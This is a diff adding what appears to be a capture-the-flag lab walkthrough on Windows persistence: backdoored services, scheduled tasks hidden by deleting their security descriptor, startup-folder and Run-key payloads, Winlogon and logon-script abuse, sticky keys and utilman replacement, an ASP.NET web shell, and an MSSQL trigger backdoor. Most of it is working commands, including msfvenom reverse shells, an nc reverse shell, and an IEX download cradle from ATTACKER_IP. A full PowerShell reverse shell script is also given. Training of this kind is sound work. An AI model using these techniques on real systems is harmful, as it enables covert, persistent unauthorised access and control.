@@ -20,6 +20,400 @@ ProgID in registry
 In this case, when you try to open a .txt file, the system will execute %SystemRoot%\system32\NOTEPAD.EXE %1, where %1 represents the name of the opened file. If we want to hijack this extension, we could replace the command with a script that executes a backdoor and then opens the file as usual. First, let's create a ps1 script with the following content and save it to C:\Windows\backdoor2.ps1:
 
 
+Creating backdoor services
+
+We can create and start a service named "THMservice" using the following commands:
+
+sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
+sc.exe start THMservice
+Note: There must be a space after each equal sign for the command to work.
+
+The "net user" command will be executed when the service is started, resetting the Administrator's password to Passwd123. Notice how the service has been set to start automatically (start= auto), so that it runs without requiring user interaction.
+
+Resetting a user's password works well enough, but we can also create a reverse shell with msfvenom and associate it with the created service. Notice, however, that service executables are unique since they need to implement a particular protocol to be handled by the system. If you want to create an executable that is compatible with Windows services, you can use the exe-service format in msfvenom:
+
+AttackBox
+user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
+You can then copy the executable to your target system, say in C:\Windows and point the service's binPath to it:
+
+sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
+sc.exe start THMservice2
+This should create a connection back to your attacker's machine.
+
+
+Modifying existing services
+
+While creating new services for persistence works quite well, the blue team may monitor new service creation across the network. We may want to reuse an existing service instead of creating one to avoid detection. Usually, any disabled service will be a good candidate, as it could be altered without the user noticing it.
+
+You can get a list of available services using the following command:
+
+Command Prompt
+C:\> sc.exe query state=all
+SERVICE_NAME: THMService1
+DISPLAY_NAME: THMService1
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 1  STOPPED
+        WIN32_EXIT_CODE    : 1077  (0x435)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+You should be able to find a stopped service called THMService3. To query the service's configuration, you can use the following command:
+
+Command Prompt
+C:\> sc.exe qc THMService3
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: THMService3
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2 AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\MyService\THMService.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : THMService3
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : NT AUTHORITY\Local Service
+There are three things we care about when using a service for persistence:
+
+The executable (BINARY_PATH_NAME) should point to our payload.
+The service START_TYPE should be automatic so that the payload runs without user interaction.
+The SERVICE_START_NAME, which is the account under which the service will run, should preferably be set to LocalSystem to gain SYSTEM privileges.
+Let's start by creating a new reverse shell with msfvenom:
+
+AttackBox
+user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe
+To reconfigure "THMservice3" parameters, we can use the following command:
+
+Command Prompt
+C:\> sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
+You can then query the service's configuration again to check if all went as expected:
+
+Command Prompt
+C:\> sc.exe qc THMservice3
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: THMservice3
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Windows\rev-svc2.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : THMservice3
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+
+
+Task Scheduler
+
+The most common way to schedule tasks is using the built-in Windows task scheduler. The task scheduler allows for granular control of when your task will start, allowing you to configure tasks that will activate at specific hours, repeat periodically or even trigger when specific system events occur. From the command line, you can use schtasks to interact with the task scheduler. A complete reference for the command can be found on Microsoft's website.
+
+Let's create a task that runs a reverse shell every single minute. In a real-world scenario, you wouldn't want your payload to run so often, but we don't want to wait too long for this room:
+
+Command Prompt
+C:\> schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
+SUCCESS: The scheduled task "THM-TaskBackdoor" has successfully been created.
+Note: Be sure to use THM-TaskBackdoor as the name of your task, or you won't get the flag.
+
+The previous command will create a "THM-TaskBackdoor" task and execute an nc64 reverse shell back to the attacker. The /sc and /mo options indicate that the task should be run every single minute. The /ru option indicates that the task will run with SYSTEM privileges.
+
+To check if our task was successfully created, we can use the following command:
+
+Command Prompt
+C:\> schtasks /query /tn thm-taskbackdoor
+
+Folder: \
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+thm-taskbackdoor                         5/25/2022 8:08:00 AM   Ready
+Making Our Task Invisible
+
+Our task should be up and running by now, but if the compromised user tries to list its scheduled tasks, our backdoor will be noticeable. To further hide our scheduled task, we can make it invisible to any user in the system by deleting its Security Descriptor (SD). The security descriptor is simply an ACL that states which users have access to the scheduled task. If your user isn't allowed to query a scheduled task, you won't be able to see it anymore, as Windows only shows you the tasks that you have permission to use. Deleting the SD is equivalent to disallowing all users' access to the scheduled task, including administrators.
+
+The security descriptors of all scheduled tasks are stored in HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\. You will find a registry key for every task, under which a value named "SD" contains the security descriptor. You can only erase the value if you hold SYSTEM privileges.
+
+To hide our task, let's delete the SD value for the "THM-TaskBackdoor" task we created before. To do so, we will use psexec (available in C:\tools) to open Regedit with SYSTEM privileges:
+
+Command Prompt
+C:\> c:\tools\pstools\PsExec64.exe -s -i regedit
+We will then delete the security descriptor for our task:
+
+Task Scheduler SD
+
+If we try to query our service again, the system will tell us there is no such task:
+
+Command Prompt
+C:\> schtasks /query /tn thm-taskbackdoor ERROR: The system cannot find the file specified.
+If we start an nc listener in our attacker's machine, we should get a shell back after a minute:
+
+AttackBox
+user@AttackBox$ nc -lvp 4449
+
+
+Startup folder
+
+Each user has a folder under C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup where you can put executables to be run whenever the user logs in. An attacker can achieve persistence just by dropping a payload in there. Notice that each user will only run whatever is available in their folder.
+
+If we want to force all users to run a payload while logging in, we can use the folder under C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp in the same way.
+
+For this task, let's generate a reverse shell payload using msfvenom:
+
+AttackBox
+user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe
+We will then copy our payload into the victim machine. You can spawn an http.server with Python3 and use wget on the victim machine to pull your file:
+
+AttackBox
+user@AttackBox$ python3 -m http.server 
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 
+➜	
+Powershell
+PS C:\> wget http://ATTACKER_IP:8000/revshell.exe -O revshell.exe
+We then store the payload into the C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp folder to get a shell back for any user logging into the machine.
+
+Command Prompt
+C:\> copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
+Now be sure to sign out of your session from the start menu (closing the RDP window is not enough as it leaves your session open):
+
+sign out
+
+And log back via RDP. You should immediately receive a connection back to your attacker's machine.
+
+THM flag
+Use your newly obtained shell to execute C:\flags\flag10.exe and get your flag!
+Run / RunOnce
+
+You can also force a user to execute a program on logon via the registry. Instead of delivering your payload into a specific directory, you can use the following registry entries to specify applications to run at logon:
+
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+The registry entries under HKCU will only apply to the current user, and those under HKLM will apply to everyone. Any program specified under the Run keys will run every time the user logs on. Programs specified under the RunOnce keys will only be executed a single time.
+
+For this task, let's create a new reverse shell with msfvenom:
+
+AttackBox
+user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4451 -f exe -o revshell.exe
+After transferring it to the victim machine, let's move it to C:\Windows\:
+
+Command Prompt
+C:\> move revshell.exe C:\Windows
+Let's then create a REG_EXPAND_SZ registry entry under HKLM\Software\Microsoft\Windows\CurrentVersion\Run. The entry's name can be anything you like, and the value will be the command we want to execute.
+
+Note: While in a real-world set-up you could use any name for your registry entry, for this task you are required to use MyBackdoor to receive the flag.
+
+backdoored Run entry
+
+After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10-20 seconds).
+
+THM flag
+Using your newly obtained shell, execute C:\flags\flag11.exe to get a flag!
+Winlogon
+
+Another alternative to automatically start programs on logon is abusing Winlogon, the Windows component that loads your user profile right after authentication (amongst other things).
+
+Winlogon uses some registry keys under HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\ that could be interesting to gain persistence:
+
+Userinit points to userinit.exe, which is in charge of restoring your user profile preferences.
+shell points to the system's shell, which is usually explorer.exe.
+Winlogon registry
+
+If we'd replace any of the executables with some reverse shell, we would break the logon sequence, which isn't desired. Interestingly, you can append commands separated by a comma, and Winlogon will process them all.
+
+Let's start by creating a shell:
+
+AttackBox
+user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4452 -f exe -o revshell.exe
+We'll transfer the shell to our victim machine as we did previously. We can then copy the shell to any directory we like. In this case, we will use C:\Windows:
+
+Command Prompt
+C:\> move revshell.exe C:\Windows
+We then alter either shell or Userinit in HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\. In this case we will use Userinit, but the procedure with shell is the same.
+
+Note: While both shell and Userinit could be used to achieve persistence in a real-world scenario, to get the flag in this room, you will need to use Userinit.
+
+Backdoored userinit
+
+After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10 seconds).
+
+THM flag
+Using your newly obtained shell, execute C:\flags\flag12.exe to get a flag!
+Logon scripts
+
+One of the things userinit.exe does while loading your user profile is to check for an environment variable called UserInitMprLogonScript. We can use this environment variable to assign a logon script to a user that will get run when logging into the machine. The variable isn't set by default, so we can just create it and assign any script we like.
+
+Notice that each user has its own environment variables; therefore, you will need to backdoor each separately.
+
+Let's first create a reverse shell to use for this technique:
+
+AttackBox
+user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4453 -f exe -o revshell.exe
+We'll transfer the shell to our victim machine as we did previously. We can then copy the shell to any directory we like. In this case, we will use C:\Windows:
+
+Command Prompt
+C:\> move revshell.exe C:\Windows
+To create an environment variable for a user, you can go to its HKCU\Environment in the registry. We will use the UserInitMprLogonScript entry to point to our payload so it gets loaded when the users logs in:
+
+Backdoored env
+
+Notice that this registry key has no equivalent in HKLM, making your backdoor apply to the current user only.
+
+After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10 seconds).
+
+Sticky Keys
+
+When pressing key combinations like CTRL + ALT + DEL, you can configure Windows to use sticky keys, which allows you to press the buttons of a combination sequentially instead of at the same time. In that sense, if sticky keys are active, you could press and release CTRL, press and release ALT and finally, press and release DEL to achieve the same effect as pressing the CTRL + ALT + DEL combination.
+
+To establish persistence using Sticky Keys, we will abuse a shortcut enabled by default in any Windows installation that allows us to activate Sticky Keys by pressing SHIFT 5 times. After inputting the shortcut, we should usually be presented with a screen that looks as follows:
+
+sticky keys
+
+After pressing SHIFT 5 times, Windows will execute the binary in C:\Windows\System32\sethc.exe. If we are able to replace such binary for a payload of our preference, we can then trigger it with the shortcut. Interestingly, we can even do this from the login screen before inputting any credentials.
+
+A straightforward way to backdoor the login screen consists of replacing sethc.exe with a copy of cmd.exe. That way, we can spawn a console using the sticky keys shortcut, even from the logging screen.
+
+To overwrite sethc.exe, we first need to take ownership of the file and grant our current user permission to modify it. Only then will we be able to replace it with a copy of cmd.exe. We can do so with the following commands:
+
+Command Prompt
+C:\> takeown /f c:\Windows\System32\sethc.exe
+
+SUCCESS: The file (or folder): "c:\Windows\System32\sethc.exe" now owned by user "PURECHAOS\Administrator".
+
+C:\> icacls C:\Windows\System32\sethc.exe /grant Administrator:F
+processed file: C:\Windows\System32\sethc.exe
+Successfully processed 1 files; Failed processing 0 files
+
+C:\> copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
+Overwrite C:\Windows\System32\sethc.exe? (Yes/No/All): yes
+        1 file(s) copied.
+After doing so, lock your session from the start menu:
+
+lock session
+
+You should now be able to press SHIFT five times to access a terminal with SYSTEM privileges directly from the login screen:
+
+sethc backdoor
+
+THM flag
+From your newly obtained terminal, execute C:\flags\flag14.exe to get your flag!
+Utilman
+
+Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:
+
+utilman
+
+When we click the ease of access button on the login screen, it executes C:\Windows\System32\Utilman.exe with SYSTEM privileges. If we replace it with a copy of cmd.exe, we can bypass the login screen again.
+
+To replace utilman.exe, we do a similar process to what we did with sethc.exe:
+
+Command Prompt
+C:\> takeown /f c:\Windows\System32\utilman.exe
+
+SUCCESS: The file (or folder): "c:\Windows\System32\utilman.exe" now owned by user "PURECHAOS\Administrator".
+
+C:\> icacls C:\Windows\System32\utilman.exe /grant Administrator:F
+processed file: C:\Windows\System32\utilman.exe
+Successfully processed 1 files; Failed processing 0 files
+
+C:\> copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
+Overwrite C:\Windows\System32\utilman.exe? (Yes/No/All): yes
+        1 file(s) copied.
+To trigger our terminal, we will lock our screen from the start button:
+
+lock session
+
+And finally, proceed to click on the "Ease of Access" button. Since we replaced utilman.exe with a cmd.exe copy, we will get a command prompt with SYSTEM privileges:
+
+
+
+
+
+
+Using Web Shells
+
+The usual way of achieving persistence in a web server is by uploading a web shell to the web directory. This is trivial and will grant us access with the privileges of the configured user in IIS, which by default is iis apppool\defaultapppool. Even if this is an unprivileged user, it has the special SeImpersonatePrivilege, providing an easy way to escalate to the Administrator using various known exploits. For more information on how to abuse this privilege, see the Windows Privesc Room.
+
+Let's start by downloading an ASP.NET web shell. A ready to use web shell is provided here, but feel free to use any you prefer. Transfer it to the victim machine and move it into the webroot, which by default is located in the C:\inetpub\wwwroot directory:
+
+Command Prompt
+C:\> move shell.aspx C:\inetpub\wwwroot\
+Note: Depending on the way you create/transfer shell.aspx, the permissions in the file may not allow the web server to access it. If you are getting a Permission Denied error while accessing the shell's URL, just grant everyone full permissions on the file to get it working. You can do so with icacls shell.aspx /grant Everyone:F.
+
+We can then run commands from the web server by pointing to the following URL:
+
+http://10.67.156.65/shell.aspx
+
+web shell
+
+THM flag
+Use your web shell to execute C:\flags\flag16.exe to get your flag!
+While web shells provide a simple way to leave a backdoor on a system, it is usual for blue teams to check file integrity in the web directories. Any change to a file in there will probably trigger an alert.
+
+Using MSSQL as a Backdoor
+
+There are several ways to plant backdoors in MSSQL Server installations. For now, we will look at one of them that abuses triggers. Simply put, triggers in MSSQL allow you to bind actions to be performed when specific events occur in the database. Those events can range from a user logging in up to data being inserted, updated or deleted from a given table. For this task, we will create a trigger for any INSERT into the HRDB database.
+
+Before creating the trigger, we must first reconfigure a few things on the database. First, we need to enable the xp_cmdshell stored procedure. xp_cmdshell is a stored procedure that is provided by default in any MSSQL installation and allows you to run commands directly in the system's console but comes disabled by default.
+
+To enable it, let's open Microsoft SQL Server Management Studio 18, available from the start menu. When asked for authentication, just use Windows Authentication (the default value), and you will be logged on with the credentials of your current Windows User. By default, the local Administrator account will have access to all DBs.
+
+Once logged in, click on the New Query button to open the query editor:
+
+New SQL query
+
+Run the following SQL sentences to enable the "Advanced Options" in the MSSQL configuration, and proceed to enable xp_cmdshell.
+
+sp_configure 'Show Advanced Options',1;
+RECONFIGURE;
+GO
+
+sp_configure 'xp_cmdshell',1;
+RECONFIGURE;
+GO
+After this, we must ensure that any website accessing the database can run xp_cmdshell. By default, only database users with the sysadmin role will be able to do so. Since it is expected that web applications use a restricted database user, we can grant privileges to all users to impersonate the sa user, which is the default database administrator:
+
+USE master
+
+GRANT IMPERSONATE ON LOGIN::sa to [Public];
+After all of this, we finally configure a trigger. We start by changing to the HRDB database:
+
+USE HRDB
+Our trigger will leverage xp_cmdshell to execute Powershell to download and run a .ps1 file from a web server controlled by the attacker. The trigger will be configured to execute whenever an INSERT is made into the Employees table of the HRDB database:
+
+CREATE TRIGGER [sql_backdoor]
+ON HRDB.dbo.Employees 
+FOR INSERT AS
+
+EXECUTE AS LOGIN = 'sa'
+EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
+Now that the backdoor is set up, let's create evilscript.ps1 in our attacker's machine, which will contain a Powershell reverse shell:
+
+$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);
+
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+    $sendback = (iex $data 2>&1 | Out-String );
+    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush()
+};
+
+$client.Close()
+We will need to open two terminals to handle the connections involved in this exploit:
+
+The trigger will perform the first connection to download and execute evilscript.ps1. Our trigger is using port 8000 for that.
+The second connection will be a reverse shell on port 4454 back to our attacker machine.
+AttackBox
+user@AttackBox$ python3 -m http.server 
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 
+ 	
+AttackBox
+user@AttackBox$ nc -lvp 4454
+Listening on 0.0.0.0 4454
+With all that ready, let's navigate to http://10.67.156.65/ and insert an employee into the web application. Since the web application will send an INSERT statement to the database, our TRIGGER will provide us access to the system's console.
 
 
 
